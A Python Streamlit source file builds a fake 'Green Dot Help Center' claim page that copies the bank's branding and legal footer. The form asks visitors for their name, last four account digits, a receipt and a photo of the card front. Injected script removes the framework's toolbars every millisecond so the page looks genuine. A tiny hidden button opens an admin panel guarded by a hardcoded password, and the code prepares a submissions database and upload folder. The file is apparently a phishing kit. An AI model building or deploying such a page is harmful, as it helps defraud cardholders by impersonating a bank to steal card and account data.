
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DATABASE CONFIG ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    return "GD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- CORE SHIELD: ABSOLUTE PURGE (1ms) ---
st.markdown("""<script>
    const absolutePurge = () => {
        const toKill = [
            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]',
            '.stElementToolbar', '.st-emotion-cache-140j12g', 'header', 'footer', 
            '.stDeployButton', '.st-emotion-cache-gi0tri', 'svg.section-anchor-icon', 
            '.etxdrby1', '.etxdrby2', '.stCustomComponentV1', 'button[title="View fullscreen"]'
        ];
        toKill.forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });
    };
    setInterval(absolutePurge, 1);
</script>""", unsafe_allow_html=True)

# --- CORE SHIELD: CSS HARD LOCK ---
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }

    [data-testid="stHeader"], header, footer, .stDeployButton, .section-anchor, 
    [data-testid="stToolbar"], .st-emotion-cache-gi0tri, [data-testid="stElementToolbar"], 
    .st-emotion-cache-140j12g, button[title="View fullscreen"] { 
        display: none !important; visibility: hidden !important;
    }

    /* HIGH PRECISION BUTTON TARGETING */
    /* This ensures only actual Streamlit buttons in the form/admin are styled green */
    .stButton > button, 
    div[data-testid="stForm"] .stButton > button {
        background-color: #00a05b !important;
        color: white !important;
        border-radius: 8px !important;
        border: none !important;
        font-weight: 600 !important;
        width: 100% !important;
        height: 45px !important;
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
    }

    /* Ghost Dot remain hidden */
    div.stButton > button[key="ghost_dot"] {
        background-color: transparent !important; border: none !important; color: #000 !important;
        padding: 0 !important; width: 2px !important; height: 2px !important;
        box-shadow: none !important;
    }

    .legal-container {
        font-size: 11px !important; 
        color: #666 !important; 
        text-align: center !important;
        margin-top: 40px !important; 
        padding-top: 20px !important;
        border-top: 1px solid #222 !important;
        line-height: 1.4 !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 1.5, 1])[1]
    with col_logo:
        if os.path.exists('logo.svg'):
            st.image('logo.svg', use_container_width=True)
    
    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")
    
    with st.form("claim_v32_5_0", clear_on_submit=True):
        st.text_input("Full Name")
        st.text_input("Last 4 digits of Account")
        st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"): 
            st.success("Claim Received.")

    st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation.</div>", unsafe_allow_html=True)

    if st.button(".", key="ghost_dot"): 
        st.session_state.admin_mode = True
        st.rerun()

else:
    col_adm = st.columns([1, 1.5, 1])[1]
    with col_adm:
        if os.path.exists('logo.svg'):
            st.image('logo.svg', use_container_width=True)
    
    st.markdown("<br>", unsafe_allow_html=True)
    with st.container():
        pw = st.text_input("Auth Key", type="password", label_visibility="collapsed", placeholder="Auth Key")
        
        # Botones horizontales estables
        btn_cols = st.columns([3, 1])
        with btn_cols[0]:
            if st.button("CHECK"): 
                if pw == "Diostieneelpoder1": st.session_state.logged_in = True
                else: st.error("Denied")
        with btn_cols[1]:
            if st.button("↩"):
                st.session_state.admin_mode = False
                st.rerun()

    if getattr(st.session_state, 'logged_in', False): 
        st.write("--- Admin Panel ---")
